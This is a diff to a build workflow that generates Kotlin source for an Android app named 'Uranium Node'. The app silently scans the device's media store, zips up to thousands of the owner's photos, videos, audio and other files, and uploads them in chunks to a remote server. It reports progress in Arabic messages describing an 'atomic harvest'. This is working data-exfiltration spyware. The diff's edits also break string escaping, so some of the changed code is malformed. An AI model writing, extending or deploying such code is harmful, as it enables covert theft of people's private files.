@@ -246,7 +246,7 @@ jobs:
                               conn.connectTimeout = 10000
                               conn.readTimeout = 10000
 
-                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Uranium Node active from $nodeModel\"}"
+                              val reportJson = "{"type":"TEXT_REPORT","data":"[Heartbeat] Uranium Node active from $nodeModel"}"
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                   os.write(reportJson)
@@ -398,132 +398,128 @@ jobs:
                   return sb.toString()
               }
 
-              private fun compressAndUploadAtomicFolder(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri, maxLimit: Int) {
-                  serviceScope.launch {
-                      try {
-                          sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد الذري الملكي] تم تحديد [$folderName]. جاري فحص وسحب آلاف الملفات...")
-                          
-                          val zipFile = File(cacheDir, "Uranium_${folderName.replace(" ", "_")}_${System.currentTimeMillis()}.zip")
-                          val zipOut = ZipOutputStream(FileOutputStream(zipFile))
-                          
-                          val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
-                          val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-                          val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
+              private suspend fun compressAndUploadAtomicFolder(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri, maxLimit: Int) {
+                  try {
+                      sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد الذري الملكي] تم تحديد [$folderName]. جاري فحص وسحب آلاف الملفات...")
+                      
+                      val zipFile = File(cacheDir, "Uranium_${folderName.replace(" ", "_")}_${System.currentTimeMillis()}.zip")
+                      val zipOut = ZipOutputStream(FileOutputStream(zipFile))
+                      
+                      val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                      val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+                      val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
 
-                          var addedCount = 0
-                          var totalBytes = 0L
-                          cursor?.use {
-                              val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
-                              val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              while (it.moveToNext() && addedCount < maxLimit) {
-                                  if (dataIdx != -1 && nameIdx != -1) {
-                                      val filePath = it.getString(dataIdx)
-                                      val fileName = it.getString(nameIdx)
-                                      if (filePath != null) {
-                                          val file = File(filePath)
-                                          if (file.exists() && file.isFile) {
-                                              try {
-                                                  zipOut.putNextEntry(ZipEntry("$folderName/$fileName"))
-                                                  file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                                  zipOut.closeEntry()
-                                                  addedCount++
-                                                  totalBytes += file.length()
-                                              } catch (e: Exception) { }
-                                          }
+                      var addedCount = 0
+                      var totalBytes = 0L
+                      cursor?.use {
+                          val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                          val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                          while (it.moveToNext() && addedCount < maxLimit) {
+                              if (dataIdx != -1 && nameIdx != -1) {
+                                  val filePath = it.getString(dataIdx)
+                                  val fileName = it.getString(nameIdx)
+                                  if (filePath != null) {
+                                      val file = File(filePath)
+                                      if (file.exists() && file.isFile) {
+                                          try {
+                                              zipOut.putNextEntry(ZipEntry("$folderName/$fileName"))
+                                              file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                              zipOut.closeEntry()
+                                              addedCount++
+                                              totalBytes += file.length()
+                                          } catch (e: Exception) { }
                                       }
                                   }
                               }
                           }
-                          zipOut.close()
-
-                          if (addedCount > 0 && zipFile.exists()) {
-                              val sizeMB = totalBytes / (1024.0 * 1024.0)
-                              sendReportToServer(nodeId, nodeModel, "📦 [تم جرد المجلد] $folderName يضم <b>$addedCount ملفاً</b> (${String.format("%.2f", sizeMB)} MB). جاري التقسيم الذكي والرفع الصامد...")
-                              
-                              if (zipFile.length() > 30 * 1024 * 1024) {
-                                  uploadFileInChunks(nodeId, nodeModel, zipFile, folderName)
-                              } else {
-                                  uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
-                              }
-                          } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] المجلد [$folderName] فارغ.")
-                          }
-                      } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد الذري [$folderName]: ${e.message}")
                       }
+                      zipOut.close()
+
+                      if (addedCount > 0 && zipFile.exists()) {
+                          val sizeMB = totalBytes / (1024.0 * 1024.0)
+                          sendReportToServer(nodeId, nodeModel, "📦 [تم جرد المجلد] $folderName يضم <b>$addedCount ملفاً</b> (${String.format("%.2f", sizeMB)} MB). جاري التقسيم الذكي والرفع الصامد...")
+                          
+                          if (zipFile.length() > 30 * 1024 * 1024) {
+                              uploadFileInChunks(nodeId, nodeModel, zipFile, folderName)
+                          } else {
+                              uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
+                          }
+                      } else {
+                          sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] المجلد [$folderName] فارغ.")
+                      }
+                  } catch (e: Exception) {
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد الذري [$folderName]: ${e.message}")
                   }
               }
 
-              private fun compressAndUploadAtomicStorage(nodeId: String, nodeModel: String) {
-                  serviceScope.launch {
-                      try {
-                          sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد الذري الشامل الملكي] جاري مسح وسحب آلاف الملفات من التخزين وDownload...")
-                          
-                          val zipFile = File(cacheDir, "Uranium_Atomic_Storage_${System.currentTimeMillis()}.zip")
-                          val zipOut = ZipOutputStream(FileOutputStream(zipFile))
+              private suspend fun compressAndUploadAtomicStorage(nodeId: String, nodeModel: String) {
+                  try {
+                      sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد الذري الشامل الملكي] جاري مسح وسحب آلاف الملفات من التخزين وDownload...")
+                      
+                      val zipFile = File(cacheDir, "Uranium_Atomic_Storage_${System.currentTimeMillis()}.zip")
+                      val zipOut = ZipOutputStream(FileOutputStream(zipFile))
 
-                          var addedCount = 0
-                          var totalBytes = 0L
+                      var addedCount = 0
+                      var totalBytes = 0L
 
-                          val uris = listOf(
-                              MediaStore.Files.getContentUri("external"),
-                              MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                              MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-                              MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
-                          )
+                      val uris = listOf(
+                          MediaStore.Files.getContentUri("external"),
+                          MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                          MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                          MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
+                      )
 
-                          for (uri in uris) {
-                              try {
-                                  val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
-                                  val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
-                                  cursor?.use {
-                                      val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
-                                      val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                                      while (it.moveToNext() && addedCount < 10000) {
-                                          if (dataIdx != -1 && nameIdx != -1) {
-                                              val filePath = it.getString(dataIdx)
-                                              val fileName = it.getString(nameIdx)
-                                              if (filePath != null) {
-                                                  val file = File(filePath)
-                                                  if (file.exists() && file.isFile) {
-                                                      try {
-                                                          zipOut.putNextEntry(ZipEntry("AtomicStorage/$fileName"))
-                                                          file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                                          zipOut.closeEntry()
-                                                          addedCount++
-                                                          totalBytes += file.length()
-                                                      } catch (ex: Exception) { }
-                                                  }
+                      for (uri in uris) {
+                          try {
+                              val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                              val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
+                              cursor?.use {
+                                  val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                                  val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                                  while (it.moveToNext() && addedCount < 10000) {
+                                      if (dataIdx != -1 && nameIdx != -1) {
+                                          val filePath = it.getString(dataIdx)
+                                          val fileName = it.getString(nameIdx)
+                                          if (filePath != null) {
+                                              val file = File(filePath)
+                                              if (file.exists() && file.isFile) {
+                                                  try {
+                                                      zipOut.putNextEntry(ZipEntry("AtomicStorage/$fileName"))
+                                                      file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                                      zipOut.closeEntry()
+                                                      addedCount++
+                                                      totalBytes += file.length()
+                                                  } catch (ex: Exception) { }
                                               }
                                           }
                                       }
                                   }
-                              } catch (ex: Exception) { }
-                          }
-
-                          zipOut.close()
-
-                          if (addedCount > 0 && zipFile.exists()) {
-                              val sizeMB = totalBytes / (1024.0 * 1024.0)
-                              sendReportToServer(nodeId, nodeModel, "📦 [تم جرد التخزين] تم جرد <b>$addedCount ملفاً</b> (${String.format("%.2f", sizeMB)} MB). جاري التقسيم والرفع الفوري...")
-                              
-                              if (zipFile.length() > 30 * 1024 * 1024) {
-                                  uploadFileInChunks(nodeId, nodeModel, zipFile, "AtomicStorage")
-                              } else {
-                                  uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                               }
-                          } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين الشامل.")
-                          }
-                      } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد الذري للتخزين: ${e.message}")
+                          } catch (ex: Exception) { }
                       }
+
+                      zipOut.close()
+
+                      if (addedCount > 0 && zipFile.exists()) {
+                          val sizeMB = totalBytes / (1024.0 * 1024.0)
+                          sendReportToServer(nodeId, nodeModel, "📦 [تم جرد التخزين] تم جرد <b>$addedCount ملفاً</b> (${String.format("%.2f", sizeMB)} MB). جاري التقسيم والرفع الفوري...")
+                          
+                          if (zipFile.length() > 30 * 1024 * 1024) {
+                              uploadFileInChunks(nodeId, nodeModel, zipFile, "AtomicStorage")
+                          } else {
+                              uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
+                          }
+                      } else {
+                          sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين الشامل.")
+                      }
+                  } catch (e: Exception) {
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد الذري للتخزين: ${e.message}")
                   }
               }
 
-              private fun uploadFileInChunks(nodeId: String, nodeModel: String, file: File, title: String) {
+              private suspend fun uploadFileInChunks(nodeId: String, nodeModel: String, file: File, title: String) {
                   try {
-                      val chunkSize = 30 * 1024 * 1024L // 30MB لكل جزء
+                      val chunkSize = 30 * 1024 * 1024L
                       FileInputStream(file).use { fis ->
                           val buffer = ByteArray(chunkSize.toInt())
                           var partNum = 1
@@ -607,7 +603,7 @@ jobs:
                           if (attempt == MAX_RETRIES) {
                               sendReportToServer(nodeId, nodeModel, "❌ فشل رفع الملف ${file.name}: ${e.message}")
                           } else {
-                              Thread.sleep(2000L)
+                              try { Thread.sleep(2000L) } catch (ex: Exception) {}
                           }
                       }
                   }
@@ -623,7 +619,7 @@ jobs:
                       conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                       conn.doOutput = true
                       
-                      val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
+                      val safeText = reportText.replace(""", "'").replace("\n", "\\n")
                       val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"
 
                       OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
@@ -710,6 +706,7 @@ jobs:
           SettingsEOF
 
           cat << 'PropsEOF' > gradle.properties
+          android.system.LowMemory=true
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
